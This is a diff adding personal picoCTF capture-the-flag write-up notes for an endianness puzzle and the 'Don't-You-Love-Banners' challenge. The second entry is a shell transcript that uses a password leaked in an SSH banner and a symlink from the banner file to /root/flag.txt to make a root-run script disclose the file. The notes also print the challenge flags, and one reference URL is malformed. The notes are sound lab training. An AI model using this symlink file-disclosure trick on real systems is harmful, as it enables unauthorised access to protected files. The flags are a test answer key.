@@ -832,3 +832,137 @@ Flag: picoCTF{learning_about_converting_values_00a975ff}
 ```
 
 picoCTF{learning_about_converting_values_00a975ff}
+
+### Endianness 
+Know of little and big endian? \
+Source \
+Additional details will be available after launching your challenge instance.
+#### Get Little Endian
+1. Go to Cyberchef
+Choose `Reverse` \
+Choose `To Hex` choose the Delimiter as `None`\
+#### Go to Big Endian
+1. Reverse the string
+#### References
+https://medium.com/@https://medium.com/@Espress0/picoctf-endianness-little-and-big-endian-95ab226fd23d
+
+picoCTF{3ndi4n_sw4p_su33ess_817b7cfe}
+
+### Don't-You-Love-Banners 
+Can you abuse the banner? \
+The server has been leaking some crucial information on tethys.picoctf.net 51720. Use the leaked information to get to the server. \
+To connect to the running application use nc tethys.picoctf.net 50668. From the above information abuse the machine and find the flag in the /root directory.
+```
+momo1126-picoctf@webshell:~$ nc tethys.picoctf.net 57257
+SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
+
+Protocol mismatch.
+
+momo1126-picoctf@webshell:~$ nc tethys.picoctf.net 58097
+*************************************
+**************WELCOME****************
+*************************************
+
+what is the password? 
+My_Passw@rd_@1234
+What is the top cyber security conference in the world?
+DEF CON
+the first hacker ever was known for phreaking(making free phone calls), who was it?
+John
+player@challenge:~$ ls
+ls
+banner  text
+player@challenge:~$ cat text
+cat text
+keep digging
+player@challenge:~$ ls /root
+ls /root
+flag.txt  script.py
+player@challenge:~$ cat flag.txt
+cat flag.txt
+cat: flag.txt: No such file or directory
+player@challenge:~$ cat /root/flag.txt
+cat /root/flag.txt
+cat: /root/flag.txt: Permission denied
+player@challenge:~$ cat script.py
+cat script.py
+cat: script.py: No such file or directory
+player@challenge:~$ ls
+ls
+banner  text
+player@challenge:~$ ls /root
+ls /root
+flag.txt  script.py
+player@challenge:~$ cat script.py
+cat script.py
+cat: script.py: No such file or directory
+player@challenge:~$ cat /root/script.py
+cat /root/script.py
+
+import os
+import pty
+
+incorrect_ans_reply = "Lol, good try, try again and good luck\n"
+
+if __name__ == "__main__":
+    try:
+      with open("/home/player/banner", "r") as f:
+        print(f.read())
+    except:
+      print("*********************************************")
+      print("***************DEFAULT BANNER****************")
+      print("*Please supply banner in /home/player/banner*")
+      print("*********************************************")
+
+try:
+    request = input("what is the password? \n").upper()
+    while request:
+        if request == 'MY_PASSW@RD_@1234':
+            text = input("What is the top cyber security conference in the world?\n").upper()
+            if text == 'DEFCON' or text == 'DEF CON':
+                output = input(
+                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
+                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
+                    scmd = 'su - player'
+                    pty.spawn(scmd.split(' '))
+
+                else:
+                    print(incorrect_ans_reply)
+            else:
+                print(incorrect_ans_reply)
+        else:
+            print(incorrect_ans_reply)
+            break
+
+except:
+    KeyboardInterrupt
+
+player@challenge:~$ rm banner
+rm banner
+player@challenge:~$ ls
+ls
+text
+player@challenge:~$ ln -s /root/flag.txt ./banner
+ln -s /root/flag.txt ./banner
+player@challenge:~$ ls
+ls
+banner  text
+player@challenge:~$ python3 /root/script.py
+python3 /root/script.py
+*********************************************
+***************DEFAULT BANNER****************
+*Please supply banner in /home/player/banner*
+*********************************************
+what is the password? 
+^C
+momo1126-picoctf@webshell:~$ nc tethys.picoctf.net 58097
+picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}
+
+what is the password? 
+```
+#### References UNDERSTAND, REDO
+https://medium.com/@m.mehloul/picoctf-2024-dont-you-love-banners-writeup-a2a91822d074 
+
+https://medium.com/@niceselol/picoctf-2024-dont-you-love-banners-40b8c1fc5050
+
+picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_b3ee718e}
